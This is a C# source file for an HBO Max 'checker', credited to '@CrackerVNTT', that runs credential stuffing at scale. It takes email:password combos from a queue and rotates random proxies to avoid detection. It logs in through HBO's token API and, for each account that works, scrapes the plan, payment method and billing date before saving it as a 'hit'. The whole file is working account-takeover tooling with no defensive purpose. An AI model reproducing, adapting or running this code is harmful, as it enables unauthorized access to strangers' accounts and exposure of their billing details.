using Parsing;
using System;
using System.Collections.Generic;
using System.Linq;
using Request;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using HboMax2._0.Variables;
using HboMax2._0.Utils;

namespace HboMax2._0.Checker
{
    public class ChH
    {
        public static void Checker(ProxyType proxyType)
        {


            while (true)
            {


                if (Va.cooque.Count() <= 0)
                {
                    Util.StopThreads(Va.threads);
                    GlobalData.Working = false;
                    break;

                }


                string text;
                Va.cooque.TryDequeue(out text);
                string[] array = text.Split(new char[]
                {
                    ':'
                });

                string co = array[0] + ":" + array[1];
                string proxyEleccion = string.Empty;




                if (proxyType != ProxyType.No)
                {
                    Random rn = new Random();
                    proxyEleccion = Va.list[rn.Next(Va.list.Count)];
                }

                Dictionary<string, string> headers = new Dictionary<string, string>()
                {

                { "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" },
                { "Accept", "application/vnd.hbo.v9.full+json" },
                { "Accept-Language", "en-us" },
                { "Accept-Encoding", "gzip, deflate" },
                { "X-Hbo-Client-Version", "Hadron/50.35.0.274 desktop (DESKTOP)" },
                { "X-Hbo-Device-Os-Version", "undefined" },
                { "X-Hbo-Device-Name", "desktop" },
                { "Origin", "https://play.hbomax.com" },
                { "Dnt", "1" },
                { "Referer", "https://play.hbomax.com/" },
                { "Te", "trailers" },
                { "Connection", "close" }
            };

                var recivedToken = Request.Request.SendRequest("https://comet.api.hbo.com/tokens", "POST", "{\"client_id\":\"7161aff6-188a-4718-8d35-69c6ae58884f\",\"client_secret\":\"7161aff6-188a-4718-8d35-69c6ae58884f\",\"scope\":\"browse video_playback_free\",\"grant_type\":\"client_credentials\",\"deviceSerialNumber\":\"" + Guid.NewGuid().ToString() + "\",\"clientDeviceData\":{\"paymentProviderCode\":\"blackmarket\"}}",
                        "application/json", headers, string.Empty, string.Empty, proxyType, proxyEleccion).Content;


                if (recivedToken.ToString().Contains("access_token"))
                {
                    string token = Parse.JSON(recivedToken.ToString(), "access_token").FirstOrDefault<string>();

                    Dictionary<string, string> headers2 = new Dictionary<string, string>()
                {
                    { "Host", "comet.api.hbo.com" },
                    { "Content-Type", "application/json" },
                    { "Authorization", "Bearer " + token },
                    { "Connection", "close" }
                };


                    var login = Request.Request.SendRequest("https://comet.api.hbo.com/tokens", "POST", "{\"grant_type\":\"user_name_password\",\"scope\":\"browse video_playback device elevated_account_management\",\"username\":\"<USER>\",\"password\":\"<PASS>\"}",
                        "application/json", headers2, array[0], array[1], proxyType, proxyEleccion, true, "Retry-After", "0");

                     


                    if (login.HeaderExitet)
                    {
                        if (login.Content.Contains("The email address or password is incorrect"))
                        {
                            Va.invalids++;
                            GlobalData.LastChecks++;
                        }
                        else if (login.Content.Contains("access_token"))
                        {
                            string token2 = Parse.JSON(login.Content.ToString(), "access_token").FirstOrDefault<string>();

                            Dictionary<string, string> headers3 = new Dictionary<string, string>()
                        {
                           { "Host", "comet.api.hbo.com" },
                           { "Content-Type", "application/json" },
                           { "Authorization", "Bearer " + token2 },
                           { "Connection", "close" }
                        };

                            var capture = Request.Request.SendRequest("https://comet.api.hbo.com/content", "POST", "[{\"id\":\"urn:hbo:billing-status:mine\"}]",
                                "application/json", headers3, string.Empty, string.Empty, proxyType, proxyEleccion).Content;


                            var captureJ = Parse.JSON(capture.ToString(), "[0].body.billingInformationMessage", false, true);


                            //Free
                            if (captureJ.Contains("tienes suscripción a HBO Max") || captureJ.Contains("You’re not subscribed to HBO Max."))
                            {
                                Va.free++;
                                GlobalData.LastChecks++;

                                Util.GuardarInfo(co, "Checker By: @CrackerVNTT", "Frees");
                            }
                            //Custom
                            else if (captureJ.Contains("ha expirado el") || captureJ.Contains("has expired"))

                            {
                                Va.custom++;
                                GlobalData.LastChecks++;

                                Util.GuardarInfo(co, "Checker By: @CrackerVNTT", "Frees");
                            }
                            //Expired
                            else if (captureJ.Contains("vence en") || captureJ.Contains("change your mind"))
                            {
                                Va.expired++;
                                GlobalData.LastChecks++;
                                Util.GuardarInfo(co, "Checker By: @CrackerVNTT", "Frees");
                            }

                            else
                            {

                                Va.hits++;
                                GlobalData.LastChecks++;
                                string captures = string.Empty;

                                foreach (var ca in captureJ)
                                {
                                    Match match7 = Regex.Match(ca, "(Plan actual: |Current Plan: )\\[(.*)\\]\\(strong\\)");
                                    Match match8 = Regex.Match(ca, "(Payment Method: |Método de pago: |factura a través de |is billed through )\\[(.*)\\]\\(strong\\)( |\\.)");
                                    Match match9 = Regex.Match(ca, "(facturación: |Billing Date: )\\[(.*)T(.*)\\]\\(strongDate\\)");
                                    if (match7.Success || match8.Success || match9.Success)
                                    {
                                        string planActual = match7.Groups[2].Value;
                                        string payment = match8.Groups[2].Value;
                                        string facturacion = match9.Groups[2].Value;

                                        captures = "Plan: " + planActual + " Payment:  [" + payment + "]" + facturacion;

                                    }

                                }


                                Util.GuardarInfo(co, captures + " | " + " Checker By: @CrackerVNTT", "hits");
                            }



                        }
                        else
                        {

                            Va.retrys++;
                            Va.cooque.Enqueue(co);
                        }

                    }
                    else
                    {

                        Va.retrys++;
                        Va.cooque.Enqueue(co);
                    }

                }
                else
                {

                    Va.retrys++;
                    Va.cooque.Enqueue(co);

                }



            }


        }

    }
}